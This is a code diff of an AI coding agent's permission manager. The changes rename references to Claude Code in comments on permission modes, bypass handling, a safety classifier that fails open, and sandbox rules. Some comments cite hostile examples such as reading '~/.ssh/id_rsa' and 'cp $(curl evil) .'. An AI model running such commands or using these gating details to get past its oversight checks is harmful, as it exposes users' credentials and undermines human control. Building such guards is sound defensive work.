   if (rulePrefix !== null && commandHasRulePrefix(strippedRaw, rulePrefix)) return true;
   if (matchPattern(pattern, strippedRaw)) return true;
-  // Env-prefix-scoped rule parity: Claude deliberately KEEPS leading `VAR=...`
+  // Env-prefix-scoped rule parity: the reference deliberately KEEPS leading `VAR=...`
   // assignments in the matchable command prefix (`GOEXPERIMENT=synctest go test`,
   // `PYTHONPATH=/tmp python3`) so an allow/deny rule can be scoped to a command
   // TOGETHER WITH its specific env prefix (utils/bash/commands.ts L478-484). AMI
@@ -5689,7 +5689,7 @@ function matchBashSub(pattern: string, sub: string, ruleAction: 'allow' | 'deny'
   // deny on `Remove-Item` blocks `rm`/`del`/`ri` and a rule on `rm` blocks
   // `Remove-Item`. Deny/ask strip a module prefix (fail-safe over-match); allow
   // keeps it (allow must never over-match a differently-scoped cmdlet). The
-  // compare is case-insensitive, mirroring Windows + Claude's PowerShell
+  // compare is case-insensitive, mirroring Windows + the reference's PowerShell
   // filterRulesByContentsMatchingInput. Gated off POSIX so a Linux `rm`/`echo`
   // is never canonicalized into a PowerShell cmdlet (which would fail OPEN on an
   // allow rule or wrongly fire a PowerShell-named deny).
@@ -5828,7 +5828,7 @@ function collectSafeLoopVars(command: string): Set<string> {
  * withhold allow-rule auto-approval for such a command and force an explicit
  * prompt.
  *
- * Mirrors Claude Code's `argLeaksValue` (PowerShell `readOnlyValidation.ts`),
+ * Mirrors the reference's `argLeaksValue` (PowerShell `readOnlyValidation.ts`),
  * ported to bash variable-expansion syntax: command-word position is exempt (it
  * is what the allow rule names); only ARGUMENTS are inspected. A reference to a
  * vetted {@link SAFE_ENV_VARS} name (`$NODE_ENV`, `$LANG`) is NOT a leak — those
@@ -5873,13 +5873,13 @@ export class PermissionManager {
   private mode: PermissionMode = 'ask';
   /** Single observer notified by {@link applyMode} on every real mode transition,
    *  regardless of which mutation path (setMode / exitPlanMode / deserialize)
-   *  triggered it. Parity: Claude's single `notifyPermissionModeChanged` choke point. */
+   *  triggered it. Parity: the reference's single `notifyPermissionModeChanged` choke point. */
   private _modeChangeListener?: PermissionModeChangeListener;
   /** Multi-subscriber set notified whenever a DECISION-AFFECTING change lands —
    *  a rule add/remove, a mode transition, or a read-root grant/revoke. Lets a
    *  still-open permission request re-evaluate itself instead of forcing the user
    *  to answer stale UI after an allow rule (or a hook's `updatedPermissions`) was
-   *  applied elsewhere while the prompt was on screen. Parity: Claude's
+   *  applied elsewhere while the prompt was on screen. Parity: the reference's
    *  `recheckPermission()` (ToolUseConfirm re-runs the decision on a concurrent
    *  rules change). A Set (not the single {@link _modeChangeListener}) because
    *  several tool-call prompts can be open at once. Empty by default, so a mutation
@@ -5891,7 +5891,7 @@ export class PermissionManager {
    * untrusted (shared/committable) settings tier — a project/`command` rule is
    * attacker-PR-able, so a broad interpreter grant it carries (`Bash(python:*)`)
    * must not silently widen auto-approval. Retained for reporting (diagnostics /
-   * introspection) via {@link getStrippedDangerousRules}. Parity: Claude's
+   * introspection) via {@link getStrippedDangerousRules}. Parity: the reference's
    * `ToolPermissionContext.strippedDangerousRules`.
    */
   private strippedDangerousRules: PermissionRule[] = [];
@@ -5899,7 +5899,7 @@ export class PermissionManager {
    * Overly-broad bash `allow` rules ({@link isOverlyBroadBashAllowRule}: pattern-less
    * / `*` bash or all-tools allow) that were stripped from an untrusted shared tier
    * at load / settings-sync time. Retained for reporting (diagnostics / introspection)
-   * via {@link getStrippedOverlyBroadBashRules}. Parity: the rules dropped by Claude's
+   * via {@link getStrippedOverlyBroadBashRules}. Parity: the rules dropped by the reference's
    * `removeDangerousPermissions(findOverlyBroadBashPermissions(...))`.
    */
   private strippedOverlyBroadBashRules: PermissionRule[] = [];
@@ -5909,26 +5909,26 @@ export class PermissionManager {
    *  (set alongside {@link _disableBypass}). Carried so `/permissions` and the
    *  Shift+Tab "auto mode unavailable" message can tell the operator what to do
    *  — e.g. "blocked by managed policy (disableBypassPermissionsMode)" — rather
-   *  than surfacing a bare boolean. Mirrors Claude's reason-differentiated
+   *  than surfacing a bare boolean. Mirrors the reference's reason-differentiated
    *  getAutoModeUnavailableReason (settings vs circuit-breaker vs org-allowlist).
    *  Cleared when bypass is re-enabled. */
   private _disableBypassReason?: string;
   /** Whether bypass-permissions mode was AVAILABLE when this session started
-   *  (Claude's ToolPermissionContext.isBypassPermissionsModeAvailable). It is the
+   *  (the reference's ToolPermissionContext.isBypassPermissionsModeAvailable). It is the
    *  POSITIVE counterpart to {@link _disableBypass}: a session launched directly in
    *  `bypassPermissions` has bypass available, and a later switch to `plan` inherits
    *  bypass semantics (see {@link check}). Defaults from the constructor's initial
    *  mode; the CLI can also set it from a launch flag via {@link setBypassModeAvailable}. */
   private _bypassModeAvailable = false;
   /** The permission mode active immediately before plan mode was entered, so a
-   *  later plan-mode exit can restore it (Claude's ToolPermissionContext.prePlanMode).
+   *  later plan-mode exit can restore it (the reference's ToolPermissionContext.prePlanMode).
    *  Undefined when not in plan mode or when none was captured. */
   private _prePlanMode?: PermissionMode;
   /** The DESIRED "run the auto-mode safety classifier while in plan mode" setting,
    *  read from the on-disk settings tiers (`useAutoModeDuringPlan`) by
    *  {@link loadTieredRules}. It is the intent; {@link _autoModeActiveDuringPlan} is
    *  the realized state. Toggling it on disk and re-syncing reconciles the realized
-   *  state via {@link transitionPlanAutoMode}. Parity: Claude's
+   *  state via {@link transitionPlanAutoMode}. Parity: the reference's
    *  getUseAutoModeDuringPlan() settings read (settings/settings.ts). */
   private _useAutoModeDuringPlan = false;
   /** Whether auto-mode screening is ACTIVE right now during the current plan run —
@@ -5938,17 +5938,17 @@ export class PermissionManager {
    *  into {@link _autoModeStrippedRules} so a broad interpreter grant cannot bypass the
    *  classifier. Reconciled against {@link _useAutoModeDuringPlan} by
    *  {@link transitionPlanAutoMode}; forced off (with rule restore) when plan mode is
-   *  left. Parity: Claude's autoModeState.isAutoModeActive() during plan. */
+   *  left. Parity: the reference's autoModeState.isAutoModeActive() during plan. */
   private _autoModeActiveDuringPlan = false;
   /** Dangerous code-exec `allow` rules stripped specifically to activate
    *  auto-mode-during-plan, held so they can be RESTORED verbatim when auto mode is
    *  deactivated (or plan mode is left). Distinct from {@link strippedDangerousRules}
    *  (load-time untrusted-source stripping, never restored) because an auto-mode strip
-   *  is temporary and reversible. Parity: Claude's
+   *  is temporary and reversible. Parity: the reference's
    *  ToolPermissionContext.strippedDangerousRules stash restored by
    *  restoreDangerousPermissions(). */
   private _autoModeStrippedRules: PermissionRule[] = [];
-  /** Managed-rules-only lockdown (Claude's `allowManagedPermissionRulesOnly`): when
+  /** Managed-rules-only lockdown (the reference's `allowManagedPermissionRulesOnly`): when
    *  true, ONLY `policySettings`-sourced rules are honored, runtime non-managed grants
    *  are refused, and nothing may be persisted. Set from the managed permissions file
    *  by {@link loadManagedPermissions} / {@link loadTieredRules}. */
@@ -5960,7 +5960,7 @@ export class PermissionManager {
    *  here. This is what makes "point the agent at /some/other/image.png" work while a
    *  silent `cat ../../other-project/secret` stays blocked.
    *
-   *  Source-tracked (parity: Claude's `additionalWorkingDirectories` Map keyed by
+   *  Source-tracked (parity: the reference's `additionalWorkingDirectories` Map keyed by
    *  path with a `{path, source}` value): the value records WHICH tier granted the
    *  root so (a) a grant can be attributed/removed by provenance and (b) only the
    *  PERSISTABLE tiers (not ephemeral `session`/`cliArg`) are written back to
@@ -5980,18 +5980,18 @@ export class PermissionManager {
    *  Backs the HOST-mode arm of `autoAllowBashIfSandboxed`: when the opt-in knob is on
    *  in a non-container policy, exactly the commands that WILL be sandboxed are
    *  auto-allowed and sandbox-incompatible ones fall through to a regular permission
-   *  prompt (parity: Claude Code's "auto-allow" sandbox mode — try sandboxed, else
+   *  prompt (parity: the reference's "auto-allow" sandbox mode — try sandboxed, else
    *  regular permissions). Undefined → host-mode auto-allow is inert (container-mode
    *  behavior unchanged). */
   private sandboxEligibilityResolver?: (command: string) => boolean;
   /** Resolver injected by the engine that reports whether a NON-bash tool call is
-   *  irreversible for this input (parity: Claude's generic `Tool.isDestructive(input)`).
+   *  irreversible for this input (parity: the reference's generic `Tool.isDestructive(input)`).
    *  Lets {@link check} apply the destructive allow-rule downgrade to ANY tool, not
    *  just bash. Absent → only bash destructiveness is considered (unchanged). */
   private toolDestructiveResolver?: (toolName: string, input: Record<string, unknown>) => boolean;
 
   /** Least-privilege capability ceiling for a forked/background sub-agent (parity:
-   *  Claude's `createAutoMemCanUseTool`). When set, {@link check} enforces it BEFORE
+   *  the reference's `createAutoMemCanUseTool`). When set, {@link check} enforces it BEFORE
    *  and INDEPENDENT of the ambient mode — a non-read-only bash command or a write
    *  outside the confined roots is denied even under auto-allow/bypass. Undefined →
    *  inert (gated exactly as before). Set per sub-engine from EngineConfig. */
@@ -6006,7 +6006,7 @@ export class PermissionManager {
    *  (`checking:true`) and FINISHES (`checking:false`) evaluating a tool call, so the
    *  engine can surface an in-flight "safety check in progress" signal while the async
    *  classifier query runs. Fired ONLY around an actual classifier consult (not on the
-   *  fast-path allow). Parity: Claude's `setClassifierChecking`/`clearClassifierChecking`
+   *  fast-path allow). Parity: the reference's `setClassifierChecking`/`clearClassifierChecking`
    *  subscribable signal (`classifierApprovals.ts`). Undefined → no signal emitted. */
   private classifierCheckingListener?: (checking: boolean, toolName: string) => void;
   /** Optional speculative bash-classifier cache injected by the engine/common layer.
@@ -6025,7 +6025,7 @@ export class PermissionManager {
   /** Unrecognized top-level keys read from `.ami/permissions.json` by {@link loadRules}
    *  (anything other than `mode`/`rules` — e.g. `hooks`, `env`, or a key a future AMI
    *  version adds). {@link saveRules} spreads these back so a round-trip through this
-   *  manager does not DESTROY settings it doesn't model. Mirrors Claude's
+   *  manager does not DESTROY settings it doesn't model. Mirrors the reference's
    *  `...settingsData` preservation spread (permissionsLoader.ts L193-L216/L277-L295). */
   private _extraPersistedKeys: Record<string, unknown> = {};
 
@@ -6051,7 +6051,7 @@ export class PermissionManager {
    * the core logger, so an operator can see exactly what the permission layer
    * changed and why. Routed through {@link logDebug} so it honors the debug-mode
    * gate, credential redaction, and the on-disk/stderr routing the logger already
-   * owns (no separate sink). Mirrors Claude Code's `logForDebugging` calls in
+   * owns (no separate sink). Mirrors the reference's `logForDebugging` calls in
    * applyPermissionUpdate / persistPermissionUpdate (utils/permissions/PermissionUpdate.ts).
    */
   private traceMutation(message: string, data?: Record<string, unknown>): void {
@@ -6064,7 +6064,7 @@ export class PermissionManager {
    * user-approved out-of-workspace read prompts. Stored resolved + normalized so the
    * containment check is a simple prefix match. Idempotent; ignores empty input.
    *
-   * `source` records the granting tier (parity: Claude's per-directory `{path,
+   * `source` records the granting tier (parity: the reference's per-directory `{path,
    * source}`). It defaults to the ephemeral `session` tier so legacy callers
    * (`/add-dir`, `--context-file`, approved prompts) grant an in-memory root that is
    * NOT persisted. Pass a persistable tier (`projectSettings`/`userSettings`/
@@ -6078,7 +6078,7 @@ export class PermissionManager {
       const abs = path.isAbsolute(p) ? p : path.resolve(p);
       // NFC-canonicalize the key so a root granted in a decomposed (NFD) Unicode
       // spelling byte-matches the NFC-normalized candidate path from
-      // resolveForCheck (realpathNFC). Mirrors Claude's state.ts setProjectRoot /
+      // resolveForCheck (realpathNFC). Mirrors the reference's state.ts setProjectRoot /
       // setCwdState `.normalize('NFC')` on every stored root path.
       const norm = path.normalize(abs).normalize('NFC');
       const prior = this.allowedReadRoots.get(norm);
@@ -6087,7 +6087,7 @@ export class PermissionManager {
       // rather than reuse a stale session-stable memo entry for the same string.
       invalidateSessionStableBaseRealpath(norm);
       // Only trace a real widening of the read boundary (idempotent re-grants of the
-      // SAME source are silent), mirroring Claude's "Adding N director(y/ies)" trace.
+      // SAME source are silent), mirroring the reference's "Adding N director(y/ies)" trace.
       // A provenance change (e.g. session → projectSettings) is a meaningful upgrade
       // worth tracing because it flips the dir from in-memory to persisted.
       if (prior === undefined) {
@@ -6120,9 +6120,9 @@ export class PermissionManager {
       // Drop the session-stable realpath memo for a revoked root so a later re-grant
       // of the same path (possibly a changed symlink target) resolves fresh.
       if (removed) invalidateSessionStableBaseRealpath(norm);
-      // (parity: Claude's removeDirectories set-filter — a removed dir is dropped
+      // (parity: the reference's removeDirectories set-filter — a removed dir is dropped
       //  from the persisted `additionalDirectories` on the next saveRules too.)
-      // Trace only an actual boundary shrink, mirroring Claude's "Removing N
+      // Trace only an actual boundary shrink, mirroring the reference's "Removing N
       // director(y/ies)" trace.
       if (removed) {
         this.traceMutation(`Removing read directory: ${norm}`);
@@ -6141,7 +6141,7 @@ export class PermissionManager {
   }
 
   /**
-   * The user-granted read roots WITH their granting tier (parity: Claude's
+   * The user-granted read roots WITH their granting tier (parity: the reference's
    * source-tracked `additionalWorkingDirectories` Map value `{path, source}`). Lets
    * a diagnostic / `/permissions` view attribute each extra directory to its origin
    * (a committed project setting vs an in-session `/add-dir`) and lets a caller
@@ -6157,7 +6157,7 @@ export class PermissionManager {
    * `session` and `cliArg` tiers, which are deliberately in-memory only (a
    * per-launch `/add-dir`/`--context-file` grant must not silently leak into a
    * committed settings file). De-duped (a `Map` key is already unique) and
-   * order-stable. Mirrors Claude's `persistPermissionUpdate` dedupe-on-add.
+   * order-stable. Mirrors the reference's `persistPermissionUpdate` dedupe-on-add.
    */
   private persistableReadRoots(): string[] {
     const out: string[] = [];
@@ -6171,10 +6171,10 @@ export class PermissionManager {
    * The file-READ deny GLOBS configured in the permission layer, so listing/search
    * tools (grep, glob) can EXCLUDE files the user forbade reading — the denied file's
    * matching lines (and even its path) never surface in results, in every output mode.
-   * Collected from every `deny` rule targeting the read tool (`file_read`, its Claude
+   * Collected from every `deny` rule targeting the read tool (`file_read`, its the reference
    * alias `Read`, or a tool-wide `*`) that carries a path glob; param-shaped rules
    * (`paramPattern`) and allow/ask rules are skipped. De-duped, order-preserving.
-   * Mirrors Claude Code's `getFileReadIgnorePatterns(toolPermissionContext)`.
+   * Mirrors the reference's `getFileReadIgnorePatterns(toolPermissionContext)`.
    */
   getFileReadIgnorePatterns(): string[] {
     const out: string[] = [];
@@ -6190,7 +6190,7 @@ export class PermissionManager {
   }
 
   /**
-   * PARITY (Claude's `/add-dir` → `SandboxManager.refreshConfig()` sync — add-dir.tsx
+   * PARITY (the reference's `/add-dir` → `SandboxManager.refreshConfig()` sync — add-dir.tsx
    * L86-94): project the given base sandbox policy with the CURRENT dynamic
    * `allowedReadRoots` folded into `filesystem.allowWrite`, so a directory widened
    * into the workspace at runtime (via `/add-dir`, `--context-file`/`--image`, or an
@@ -6206,7 +6206,7 @@ export class PermissionManager {
    * It ALSO folds the active `web_fetch` domain allow/deny rules into
    * `network.allowedHosts`/`deniedHosts`, so the SAME per-domain allowlist that
    * governs the WebFetch tool also governs in-sandbox outbound traffic (parity:
-   * Claude's sandbox-adapter, which derives sandbox network domains from WebFetch
+   * the reference's sandbox-adapter, which derives sandbox network domains from WebFetch
    * permission rules). Without this the sandbox network allowlist is never
    * populated from permissions and a sandboxed `curl example.com` is unrestricted
    * even when the user allowed only `web_fetch(github.com)`.
@@ -6288,7 +6288,7 @@ export class PermissionManager {
 
   /**
    * Install a least-privilege {@link ToolCapabilityCeiling} for this manager's
-   * engine (parity: Claude's forked-agent `canUseTool`). The ceiling is a HARD cap
+   * engine (parity: the reference's forked-agent `canUseTool`). The ceiling is a HARD cap
    * enforced ahead of every mode: it can only deny (never grant), so a forked skill
    * sub-agent can be confined to read-only bash + writes within a directory even when
    * its ambient mode is auto-allow. The engine sets this per sub-engine from
@@ -6301,7 +6301,7 @@ export class PermissionManager {
   /**
    * Register a resolver that reports whether a tool call is DESTRUCTIVE (irreversible:
    * delete / overwrite / send) for the given input, generalizing the bash
-   * destructive-command guard to ANY tool (parity: Claude's `Tool.isDestructive(input)`).
+   * destructive-command guard to ANY tool (parity: the reference's `Tool.isDestructive(input)`).
    * When it returns true for a call, an over-broad `allow` rule is downgraded to an
    * explicit prompt in `ask` mode — exactly like a destructive bash command — so a
    * wildcard allow can never silently auto-approve an irreversible operation.
@@ -6322,7 +6322,7 @@ export class PermissionManager {
    * the floor — the classifier can only tighten it, never loosen it — and any
    * `undefined`/`allow`/throw FAILS OPEN to the deterministic decision. The engine
    * injects a concrete (e.g. model-backed) classifier here; unset leaves autonomous
-   * behavior byte-for-byte unchanged. Parity: Claude's transcript/yolo classifier gate.
+   * behavior byte-for-byte unchanged. Parity: the reference's transcript/yolo classifier gate.
    */
   setAutoModeSafetyClassifier(fn: AutoModeSafetyClassifier | undefined): void {
     this.autoModeSafetyClassifier = fn;
@@ -6341,7 +6341,7 @@ export class PermissionManager {
    * only when a classifier actually runs for the call. The engine wires this to emit a
    * `classifier_checking` {@link import('./types').EngineEvent} and update the
    * {@link import('./tool-confirmation').ToolConfirmationService} in-flight set. Parity:
-   * Claude's `setClassifierChecking`/`clearClassifierChecking` subscribable signal.
+   * the reference's `setClassifierChecking`/`clearClassifierChecking` subscribable signal.
    */
   setClassifierCheckingListener(
     fn: ((checking: boolean, toolName: string) => void) | undefined,
@@ -6359,7 +6359,7 @@ export class PermissionManager {
    * window auto-approves the command without a prompt. It can only ever turn a
    * would-be prompt into an allow (never deny, never loosen a hardline/deny, which
    * resolve before the ask path). Unset leaves the prompt path byte-for-byte
-   * unchanged. Parity: Claude's speculative bash classifier
+   * unchanged. Parity: the reference's speculative bash classifier
    * (`bashPermissions.ts` + the race in `useCanUseTool.tsx`). `ttlMs` bounds how
    * long a primed-but-unconsumed check stays live.
    */
@@ -6415,7 +6415,7 @@ export class PermissionManager {
    * no classifier is installed or the command was never primed. The frontend feeds the
    * latch user interactions ({@link PendingPromptLatch.onUserInteraction}) and terminal
    * answers ({@link PendingPromptLatch.claimManualResolve}) so a pressed key can never
-   * race-lose to an in-flight auto-approval. Mirrors Claude's background
+   * race-lose to an in-flight auto-approval. Mirrors the reference's background
    * `executeAsyncClassifierCheck` on an open permission dialog (`interactiveHandler.ts`).
    */
   async resolveSpeculativeBashApprovalWhileOpen(
@@ -6436,7 +6436,7 @@ export class PermissionManager {
    * Consult the injected {@link AutoModeSafetyClassifier} for a tool call the
    * deterministic engine is about to auto-approve in an autonomous mode. Returns the
    * (possibly downgraded) verdict. No classifier, an allowlisted-safe tool
-   * ({@link isAutoModeSafeTool} — skip the check, mirroring Claude's
+   * ({@link isAutoModeSafeTool} — skip the check, mirroring the reference's
    * SAFE_YOLO_ALLOWLISTED_TOOLS fast-path), an `undefined`/`allow` verdict, or a
    * thrown error all FAIL OPEN to `allow`. A downgrade to `ask`/`deny` records the
    * denial (source `'classifier'`) and stashes its reason for
@@ -6469,7 +6469,7 @@ export class PermissionManager {
     // `allow`, an explicit `passthrough` abstain, or no verdict all FAIL OPEN to
     // the deterministic auto-approval — the classifier declined to tighten it, so
     // no downgrade reason or denial is recorded. `passthrough` is the first-class
-    // "no opinion" spelling of returning `undefined` (parity: Claude's passthrough
+    // "no opinion" spelling of returning `undefined` (parity: the reference's passthrough
     // falling through to the normal flow).
     if (!verdict || verdict.decision === 'allow' || verdict.decision === 'passthrough') return 'allow';
     // Downgrade. Carry the reason to deriveDecisionReason so the prompt / denial
@@ -6508,9 +6508,9 @@ export class PermissionManager {
    *   - HOST mode (non-container): auto-allow ONLY the commands that WILL actually be
    *     wrapped by the host (unshare) auto-sandbox — reported by the injected
    *     {@link sandboxEligibilityResolver}. A sandbox-incompatible command returns
-   *     false here and falls through to a regular permission prompt (parity: Claude
+   *     false here and falls through to a regular permission prompt (parity: the reference
    *     Code's "auto-allow" sandbox mode — try sandboxed, else regular permissions).
-   * Claude's enterprise `sandbox.autoAllowBashIfSandboxed`.
+   * the reference's enterprise `sandbox.autoAllowBashIfSandboxed`.
    */
   private bashAutoAllowedBySandbox(toolName: string, input: Record<string, unknown>): boolean {
     if (toolName !== 'bash' || typeof input.command !== 'string') return false;
@@ -6551,7 +6551,7 @@ export class PermissionManager {
    * (`auto-allow`/yolo and `bypassPermissions`). Returns true when the invocation
    * touches a credential path, a system directory, or a sensitive config path and
    * must therefore still prompt rather than be silently auto-allowed. Mirrors
-   * Claude's safetyCheck, which fires in every mode.
+   * the reference's safetyCheck, which fires in every mode.
    */
   private sensitivePathRequiresPrompt(
     toolName: string,
@@ -6593,7 +6593,7 @@ export class PermissionManager {
 
     // PARITY (additive): the env-gated synthetic permission-flow test fixture
     // (testing_permission) UNCONDITIONALLY triggers the permission prompt in every
-    // mode — mirroring Claude Code's TestingPermissionTool.checkPermissions(), which
+    // mode — mirroring the reference's TestingPermissionTool.checkPermissions(), which
     // always returns {behavior:'ask'}. It is a side-effect-free, test-only tool whose
     // sole purpose is to drive the ask → allow/deny path deterministically. Hard stops
     // still win: deny-all (there is no interactive prompt to answer) denies, and an
@@ -6622,7 +6622,7 @@ export class PermissionManager {
       }
     }
 
-    // Least-privilege capability ceiling (parity: Claude's forked-agent canUseTool).
+    // Least-privilege capability ceiling (parity: the reference's forked-agent canUseTool).
     // A HARD cap on a forked/background sub-agent — enforced ahead of every mode, so a
     // non-read-only bash command or a write outside the confined roots is denied even
     // under auto-allow/bypass. Inert (never set) for the main engine.
@@ -6642,7 +6642,7 @@ export class PermissionManager {
       return 'ask';
     }
 
-    // Scratchpad carve-out (parity: Claude's per-session scratchpad read+write
+    // Scratchpad carve-out (parity: the reference's per-session scratchpad read+write
     // allowlist, utils/permissions/filesystem.ts L384-424). A file read/write WITHIN
     // the operator-configured scratchpad dir (SUPERINFERENCE_SCRATCHPAD_DIR) is
     // auto-allowed without a prompt in EVERY mode — honoring the promise the system
@@ -6656,7 +6656,7 @@ export class PermissionManager {
       return 'allow';
     }
 
-    // autoAllowBashIfSandboxed (Claude-parity, OPT-IN): when the policy runs every
+    // autoAllowBashIfSandboxed (the reference-parity, OPT-IN): when the policy runs every
     // bash command inside a container, the container — not the prompt — is the
     // safety boundary (the host filesystem is not mounted), so an operator who set
     // sandbox.autoAllowBashIfSandboxed=true wants bash to run without a prompt in
@@ -6677,7 +6677,7 @@ export class PermissionManager {
       return 'allow';
     }
 
-    // Auto-allow plain `--help` invocations (parity: Claude's `isHelpCommand`
+    // Auto-allow plain `--help` invocations (parity: the reference's `isHelpCommand`
     // prefix-extraction bypass). A bare help request (`git commit --help`,
     // `python --help`) is side-effect-free, so it never needs a prompt in the
     // rule-evaluated modes — the user is not asked to grant a rule just to read a
@@ -6700,7 +6700,7 @@ export class PermissionManager {
       if (this.anyDenyMatches(toolName, input, /* skipParamPattern */ true)) return 'deny';
       // Sensitive-path safety still fires even under yolo/auto-allow: a bash
       // credential read/exfil or system-dir write, or an edit to a sensitive
-      // config path, must still prompt — mirroring Claude's safetyCheck (which
+      // config path, must still prompt — mirroring the reference's safetyCheck (which
       // is applied in every mode) and the bypassPermissions handling below. This
       // closes the asymmetry where `cat ~/.ssh/id_rsa` was auto-allowed in yolo
       // even though file_read of the same path is forbidden.
@@ -6713,7 +6713,7 @@ export class PermissionManager {
     // mirrors the other autonomous branches: explicit user deny/ask rules win, then
     // sensitive-path safety prompts, then the per-call screen decides allow vs block
     // ({@link screenAutoModeToolCall}). A blocked call returns `deny`, which the
-    // engine reports back so the model can try a different approach (Claude's auto
+    // engine reports back so the model can try a different approach (the reference's auto
     // mode block-and-retry fallback).
     if (this.mode === 'auto') {
       if (this.anyDenyMatches(toolName, input, /* skipParamPattern */ true)) return 'deny';
@@ -6730,7 +6730,7 @@ export class PermissionManager {
     if (this.mode === 'bypassPermissions') {
       // Explicit user deny rules are BYPASS-IMMUNE: a `{tool, action:'deny'}` rule
       // fires even in bypassPermissions mode, before the blanket auto-allow — so a
-      // user's hard stop is never silently overridden (Claude orders deny/safety
+      // user's hard stop is never silently overridden (the reference orders deny/safety
       // checks before the bypass allow, permissions.ts L1169-1281).
       if (this.anyDenyMatches(toolName, input)) return 'deny';
       // User-configured content-specific `ask` rules are ALSO bypass-immune: a
@@ -6743,7 +6743,7 @@ export class PermissionManager {
 
     if (this.mode === 'plan') {
       // A plan run that was STARTED while bypass was available inherits bypass
-      // semantics instead of the read-only allowlist (parity: Claude's
+      // semantics instead of the read-only allowlist (parity: the reference's
       // shouldBypassPermissions = mode==='plan' && isBypassPermissionsModeAvailable).
       // Explicit user deny/ask rules and sensitive-path safety still win first —
       // identical ordering to the bypassPermissions branch above — so an inherited
@@ -6763,7 +6763,7 @@ export class PermissionManager {
       // `auto` branch: explicit user deny/ask rules win, then sensitive-path safety,
       // then the static screen, then the injected classifier. Dangerous code-exec
       // `allow` rules were already stripped on activation so a prefix-rule grant cannot
-      // bypass the screen. Parity: Claude's auto mode active during plan.
+      // bypass the screen. Parity: the reference's auto mode active during plan.
       if (this._autoModeActiveDuringPlan) {
         if (this.anyDenyMatches(toolName, input, /* skipParamPattern */ true)) return 'deny';
         if (this.anyAskMatches(toolName, input)) return 'ask';
@@ -6801,9 +6801,9 @@ export class PermissionManager {
         const classification = this.classifyBashCommand(input.command);
         if (classification === 'safe') return 'allow';
         // acceptEdits also auto-allows benign edit-adjacent filesystem mutations
-        // (mkdir/touch/mv/cp/sed) — Claude's ACCEPT_EDITS_ALLOWED_COMMANDS — and
+        // (mkdir/touch/mv/cp/sed) — the reference's ACCEPT_EDITS_ALLOWED_COMMANDS — and
         // their PowerShell counterpart (Set-Content/Add-Content/Clear-Content and
-        // aliases — Claude's ACCEPT_EDITS_ALLOWED_CMDLETS, minus remove-item which
+        // aliases — the reference's ACCEPT_EDITS_ALLOWED_CMDLETS, minus remove-item which
         // AMI keeps gated) — but only when the command is not destructive
         // (rm/rmdir/Remove-Item stay gated) and does not touch a credential or
         // system path (those keep their explicit prompt).
@@ -6824,7 +6824,7 @@ export class PermissionManager {
     // Determine if this is a destructive tool call (used to guard allow rules
     // from auto-approving irreversible operations via wildcards). Covers a
     // destructive bash command AND any tool whose injected isDestructive resolver
-    // flags this input (parity: Claude's generic Tool.isDestructive(input)).
+    // flags this input (parity: the reference's generic Tool.isDestructive(input)).
     const isDestructiveToolCall = this.mode === 'ask' && this.isDestructiveToolUse(toolName, input);
 
     // Code-execution allow-rule downgrade: a matched over-broad interpreter /
@@ -6834,7 +6834,7 @@ export class PermissionManager {
     // classification and fires only in 'ask'), this keys off the matched RULE's
     // shape and fires in BOTH rule-evaluated modes ('ask' and 'acceptEdits'), so
     // such a rule is downgraded to an explicit prompt instead of silently
-    // auto-approving arbitrary code. Mirrors Claude's dangerous-permission strip.
+    // auto-approving arbitrary code. Mirrors the reference's dangerous-permission strip.
     const codeExecDowngradeMode = (this.mode === 'ask' || this.mode === 'acceptEdits') &&
       toolName === 'bash' && typeof input.command === 'string';
 
@@ -6857,7 +6857,7 @@ export class PermissionManager {
     // home, any direct child of root, a drive root, a `/*` wildcard) ALWAYS
     // confirms explicitly and can never be auto-approved by a wildcard allow rule.
     // An explicit deny rule still wins (resolved below), so it is excluded here.
-    // Mirrors Claude's checkDangerousRemovalPaths (tools/BashTool/pathValidation.ts).
+    // Mirrors the reference's checkDangerousRemovalPaths (tools/BashTool/pathValidation.ts).
     if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
         toolName === 'bash' && typeof input.command === 'string' &&
         commandHasDangerousRemoval(input.command) && !this.hasExplicitDeny(toolName, input)) {
@@ -6869,7 +6869,7 @@ export class PermissionManager {
     // (ask/acceptEdits), even under a wildcard allow rule, because the auto-allow
     // paths cannot see the runtime repo/path redirection those shapes introduce
     // (the archive is unpacked, or the link is created, AFTER the permission
-    // decision and BEFORE the later command runs). Mirrors Claude's
+    // decision and BEFORE the later command runs). Mirrors the reference's
     // GIT_SAFETY_ARCHIVE_EXTRACTORS + hasSymlinkCreate gates. An explicit deny
     // still wins via the unconditional deny scan below.
     if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
@@ -6900,7 +6900,7 @@ export class PermissionManager {
     // `cp $(curl evil) .`): the rule asserts the COMMAND is safe, not that
     // arbitrary expansion through it is. Fires in the rule-evaluated modes (deny
     // already resolved above and still wins), forcing an explicit prompt. Mirrors
-    // Claude's argLeaksValue allow-path gate. A vetted SAFE_ENV_VARS reference
+    // the reference's argLeaksValue allow-path gate. A vetted SAFE_ENV_VARS reference
     // (`$NODE_ENV`) is not a leak and stays auto-approvable.
     if ((this.mode === 'ask' || this.mode === 'acceptEdits') &&
         toolName === 'bash' && typeof input.command === 'string' &&
@@ -6963,14 +6963,14 @@ export class PermissionManager {
     message?: string;
     /**
      * Pre-baked "always allow X" rule candidates ({@link buildPermissionSuggestions})
-     * a prompt can offer for one-click acceptance (Claude's
+     * a prompt can offer for one-click acceptance (the reference's
      * `permissionResult.suggestions`). Omitted when nothing safe can be suggested.
      */
     suggestions?: PermissionUpdate[];
     /**
      * A hard, turn-aborting denial: when set the whole agentic turn should be
      * interrupted, not just the single tool call blocked. Set for `hardline`
-     * (blocked-command) denials. Mirrors Claude's deny-branch `interrupt` flag
+     * (blocked-command) denials. Mirrors the reference's deny-branch `interrupt` flag
      * (PermissionResultSchema). Omitted otherwise.
      */
     interrupt?: boolean;
@@ -6981,7 +6981,7 @@ export class PermissionManager {
      * forced the ask/deny instead of collapsing the whole chain to one verdict.
      * The aggregate `decision` above stays authoritative (deny-wins); this map is
      * purely additive diagnostics. Omitted for single (non-compound) commands,
-     * non-bash tools, and the auto-allow fast path. Mirrors Claude's
+     * non-bash tools, and the auto-allow fast path. Mirrors the reference's
      * BashPermissionRequest `subcommandResults: Map<string, PermissionResult>`
      * (tools/BashTool/bashCommandHelpers.ts L84-156).
      */
@@ -6990,7 +6990,7 @@ export class PermissionManager {
      * The EXACT path that tripped the gate, when the ask/deny was triggered by a
      * specific filesystem target (an out-of-workspace path, or a file-tool's
      * `file_path`/`path`). Lets a prompt/denial name the offending path ("… for
-     * /etc/hosts") instead of only the whole tool call. Mirrors Claude's
